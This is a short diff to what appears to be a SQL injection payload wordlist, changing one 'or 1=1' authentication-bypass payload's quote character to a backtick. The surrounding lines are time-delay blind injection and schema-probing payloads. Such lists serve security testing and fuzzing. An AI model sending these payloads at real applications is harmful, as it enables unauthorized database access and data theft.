@@ -8,7 +8,7 @@ a' waitfor delay '0:0:10'--
 1 waitfor delay '0:0:10'-- 
 a'
 ?
-‘ or 1=1 -- 
+` or 1=1 -- 
 x' AND userid IS NULL; -- 
 x' AND email IS NULL; -- 
 x' AND members.email IS NULL; -- 
